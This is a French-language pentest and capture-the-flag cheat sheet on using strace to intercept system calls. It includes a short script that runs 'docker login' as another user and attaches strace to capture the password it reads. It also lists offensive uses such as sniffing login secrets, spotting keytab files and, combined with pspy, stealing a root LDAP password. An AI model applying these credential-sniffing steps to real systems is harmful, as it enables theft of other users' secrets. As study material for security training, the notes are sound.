# STRACE

***

### <mark style="color:red;">🧩 Définition</mark>

* **strace** = outil Linux qui intercepte et affiche les **appels système** faits par un processus.
* Utile en dev pour débogage, mais aussi en **pentest** pour espionner :
  * Ouverture de fichiers sensibles.
  * Lecture/écriture de secrets dans pipes/sockets.
  * Communications réseau brutes.
* En CTF, il sert à **sniffer un mot de passe ou token** en clair pendant qu’une commande sensible tourne.

***

### <mark style="color:red;">🔐 Fonctionnement</mark>

* strace **s’attache à un PID** et affiche tous ses appels système (`read`, `write`, `openat`, `connect`, …).
* Peut montrer :
  * Les **arguments** de ces appels (par ex. contenu d’un `read()` = mots de passe).
  * Les **fichiers ouverts** (`/etc/shadow`, `/tmp/secret.txt`).
  * Les **connexions réseau**.

***

### <mark style="color:red;">⚙️ Options clés</mark>

* **Lancer un programme sous strace** :

```bash
strace -f -s 128 -e trace=all /usr/bin/docker login
```

* **Attacher à un processus existant** :

```bash
strace -p <PID>
```

* **Afficher seulement certains appels système** :

```bash
strace -e trace=openat,read,write -p <PID>
```

* **Afficher taille des buffers (ex: mots de passe)** :

```bash
strace -s 256 -p <PID>
```

* **Suivre les threads enfants** :

```bash
strace -f -p <PID>
```

***

### <mark style="color:red;">📂 Exemple offensif en CTF (ton script)</mark>

#### <mark style="color:green;">Script</mark>

```bash
#!/bin/bash
sleep 2

# 1. Lancer docker login comme un autre user
sudo -u rebecca_smith /usr/bin/docker login &

# 2. Récupérer son PID
TARGET_PID=""
while [ -z "$TARGET_PID" ]; do
    TARGET_PID=$(pgrep -u rebecca_smith -f "/usr/bin/docker login")
done

# 3. Attacher strace
sudo -u rebecca_smith /usr/bin/strace -s 128 -p $TARGET_PID -f -e trace=openat,read
```

#### <mark style="color:green;">Résultat</mark>

```
[pid 78333] read(7, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 512) = 54
```

💡 Ici → mot de passe API `-7eAZDp9-f9mg` intercepté en clair dans un `read()`.

***

### <mark style="color:red;">🎯 Cas d’usage offensifs</mark>

1. **Sniffer mots de passe pendant login**
   * `docker login`, `psql -h`, `mysql -u`, `ssh`…
   * strace révèle le mot de passe quand le binaire lit depuis stdin/socket.
2.  **Identifier fichiers secrets ouverts**

    ```
    openat(AT_FDCWD, "/etc/krb5.keytab", O_RDONLY) = 3
    ```

    ➝ tu sais que le service utilise `/etc/krb5.keytab`.
3.  **Capturer des secrets dans pipes**

    ```
    read(7, "password=SuperSecret123", 512) = 24
    ```

    ➝ mot de passe transitant entre process.
4. **Reverse engineering de service inconnu**
   * Tu attaches à un binaire sans debug symbols.
   * Tu observes les syscalls → tu comprends ce qu’il fait (ex: lire un token, se connecter à LDAP).

***

### <mark style="color:red;">📚 Combinaison avec pspy</mark>

* **pspy** = détecter **QUAND** un processus sensible démarre.
* **strace** = capturer les appels système pour en extraire les **secrets**.

Exemple concret :

```
pspy → détecte : UID=0 CMD: /usr/bin/ipa user-mod ...
strace → attache au PID → capture : --setattr userPassword=w@LoiU8Crmdep
```

➡️ Tu voles le mot de passe root LDAP en clair.

***
